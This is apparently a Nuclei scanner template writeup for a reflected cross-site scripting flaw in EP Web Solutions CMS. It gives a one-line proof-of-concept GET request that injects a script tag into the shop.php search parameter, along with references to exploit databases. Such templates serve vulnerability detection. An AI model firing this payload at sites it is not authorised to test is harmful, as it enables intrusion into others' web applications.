# Nuclei Template: EP Web Solutions CMS - Cross Site Scripting
**Template ID:** ep-web-cms-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`ep-web-cms-xss.yaml`)

## Vulnerability Information & PoC

## Description
Cross-site scripting is an attack in which an attacker injects malicious executable scripts into the code of a trusted application or website.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/shop.php?search=%22/%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
```

## References
- https://www.exploitalert.com/view-details.html?id=36197
- https://cxsecurity.com/ascii/WLB-2020090139
